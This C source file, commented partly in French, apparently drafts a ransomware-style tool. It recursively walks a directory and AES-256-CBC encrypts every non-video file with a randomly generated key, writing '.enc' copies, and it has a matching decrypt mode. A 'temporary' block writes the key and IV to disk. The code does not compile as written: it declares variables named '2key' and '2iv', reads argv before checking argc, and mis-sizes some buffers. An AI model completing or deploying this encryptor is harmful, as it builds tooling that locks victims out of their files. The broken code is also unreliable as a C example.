#include <dirent.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/stat.h>

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>


void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, char * mode);
bool doUseFile(const char *filename);
void handleErrors(void);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext);
int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext);
int encryptFile(char *filename, unsigned char *key, unsigned char *iv);
int decryptFile(char *filename, unsigned char *key, unsigned char *iv);

int main(int argc, char* argv[]){
    
    unsigned char key[32];
    unsigned char iv[16];
    RAND_priv_bytes(key, 32);
    RAND_priv_bytes(iv, 16);
    
    // !! TEMPORARY !! NEED TO REMOVE AFTER TESTS //
    // store key and iv in files
    FILE *keyFile = fopen("key.txt", "w");
    FILE *ivFile = fopen("iv.txt", "w");
    fwrite(key, 1, 32, keyFile);
    fwrite(iv, 1, 16, ivFile);
    fclose(keyFile);
    fclose(ivFile);

    int 2key, 2iv;
    FILE *fkey = fopen("key.txt", "r");
    FILE *fiv = fopen("iv.txt", "r");
    fread(2key, 1, 32, fkey);
    fread(2iv, 1, 16, fiv);
    fclose(fkey);
    fclose(fiv);
    // print key and iv
    printf("key: ");
    for(int i = 0; i < 32; i++){
        printf("%02x", 2key[i]);
    }
    printf("iv: ");
    for(int i = 0; i < 16; i++){
        printf("%02x", 2iv[i]);
    }
    // if argv[2] = -d, read key.txt and iv.txt and replace key and iv
     if(strcmp(argv[2],"-d") == 0){
        FILE *fkey = fopen("key.txt", "r");
        FILE *fiv = fopen("iv.txt", "r");
        fread(key, 1, 32, fkey);
        fread(iv, 1, 16, fiv);
        fclose(fkey);
        fclose(fiv);
        // print key and iv
        printf("key: ");
        for(int i = 0; i < 32; i++){
            printf("%02x", key[i]);
        }
        printf("\niv: ");
        for(int i = 0; i < 16; i++){
            printf("%02x", iv[i]);
        }
    }


    // END OF TEMPORARY //

    

    // argv[2] = program mode, -e = encrypt, -d = decrypt
    if(argc == 3){
        dirContent(argv[1],key,iv,argv[2]);
    }
    else{

        if(argc > 3){
            puts("ERROR: too many arguments");
            return 0;
        }

        else {
            puts("ERROR: too few arguments");
            return 0;
        }
    }

    return 0;
}


void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, char * mode){
    DIR *d = opendir(rootpath);

    if (d == NULL){
        perror("ERROR: ");
    }
    struct dirent *sd = readdir(d);



    while (sd!= NULL){

        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ // On vérifie que le fichier est un dossier et qu'il n'est pas le dossier courant ou le dossier parent
            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); // On alloue de la mémoire pour le nouveau chemin-> c'est la longueur du rootpath + du d_name + 2, 2 correspond à "/" + le \0 qui marque la fin du tableau, on caste le malloc en tableau de char, 
            strcpy(new_path,""); // clean memory of the variable
            strncat(new_path,rootpath,strlen(rootpath));
            strcat(new_path,"/");
            strncat(new_path,sd ->d_name,strlen(sd->d_name));

            dirContent(new_path,key,iv,mode);
            free(new_path);
        }

        else{
            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ // On vérifie que le fichier est un fichier régulier et qu'il n'est pas le dossier courant ou le dossier parent
                char* filepath = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2);
                strcpy(filepath,""); // clean memory of the variable
                strncat(filepath,rootpath,strlen(rootpath));
                strcat(filepath,"/");
                strncat(filepath,sd ->d_name,strlen(sd->d_name));

                if(doUseFile(sd -> d_name) == true){
                
                    printf("Nom du fichier: %s\n",sd->d_name);
                
                    if(strcmp(mode,"-e") == 0){
                        encryptFile(filepath,key,iv);
                    }
                    else if(strcmp(mode,"-d") == 0){
                        decryptFile(filepath,key,iv);
                    }
                    else{
                        puts("ERROR: invalid program mode");
                    }

                }
                else{
                    printf("Fichier ignoré:%s\n",sd->d_name);
                }
            free(filepath);
            }
        }
       sd = readdir(d);
    }
}

bool doUseFile(const char *filename){
// si le fichier est une extension vidéo, retourne false
    if(strstr(filename,".mp4") != NULL || strstr(filename,".avi") != NULL || strstr(filename,".mkv") != NULL || strstr(filename,".mov") != NULL || strstr(filename,".flv") != NULL || strstr(filename,".wmv") != NULL || strstr(filename,".mpg") != NULL || strstr(filename,".mpeg") != NULL || strstr(filename,".m4v") != NULL || strstr(filename,".webm") != NULL || strstr(filename,".vob") != NULL || strstr(filename,".ogv") != NULL || strstr(filename,".ogg") != NULL || strstr(filename,".m4v") != NULL || strstr(filename,".m4a") != NULL || strstr(filename,".3gp") != NULL || strstr(filename,".3g2") != NULL || strstr(filename,".mxf") != NULL || strstr(filename,".roq") != NULL || strstr(filename,".nsv") != NULL || strstr(filename,".f4v") != NULL || strstr(filename,".f4p") != NULL || strstr(filename,".f4a") != NULL || strstr(filename,".f4b") != NULL){
        return false;
    }
    else{ 
        return true;
        
    }


}

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;


}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

}

int encryptFile(char *filename, unsigned char *key, unsigned char *iv){
    printf("Encrypting file %s\n",filename);
    char *filepath_enc = malloc(strlen(filename) + 5);
    strcpy(filepath_enc, filename);
    strcat(filepath_enc, ".enc");


    FILE *toEncrypt = fopen(filename, "r");
    FILE *fileEncrypted = fopen(filepath_enc, "w");
    unsigned char *plaintext = malloc(1024);
    unsigned char *ciphertext = malloc(1040);
    int plaintext_len = 1024;
    while(plaintext_len == 1024){
        plaintext_len = fread(plaintext, 1, 1024, toEncrypt);
        int ciphertext_len = encrypt(plaintext, plaintext_len, key, iv, ciphertext);
        fwrite(ciphertext, 1, ciphertext_len, fileEncrypted);
        
    }
    fclose(toEncrypt);
    fclose(fileEncrypted);
    free(plaintext);
    free(ciphertext);
}
int decryptFile(char *filename, unsigned char *key, unsigned char *iv){
    printf("Decrypting file %s\n",filename);
    char *filename_dec = malloc(strlen(filename) - 4);
    strncpy(filename_dec, filename, strlen(filename) - 4);
    strcat(filename_dec, ".dec");


    FILE *toDecrypt = fopen(filename, "r");
    FILE *fileDecrypted = fopen(filename_dec, "w");
    unsigned char *decryptedtext = malloc(1024);
    unsigned char *ciphertext2 = malloc(1040);
    int decryptedtext_len = 0;
    int ciphertext_len2 = 1040;
    while(ciphertext_len2 == 1040){
        ciphertext_len2 = fread(ciphertext2, 1, 1040, toDecrypt);
        decryptedtext_len = decrypt(ciphertext2, ciphertext_len2, key, iv, decryptedtext);
        fwrite(decryptedtext, 1, decryptedtext_len, fileDecrypted);
        
        
    }
    fclose(toDecrypt);
    fclose(fileDecrypted);
    free(decryptedtext);
    free(ciphertext2);

}
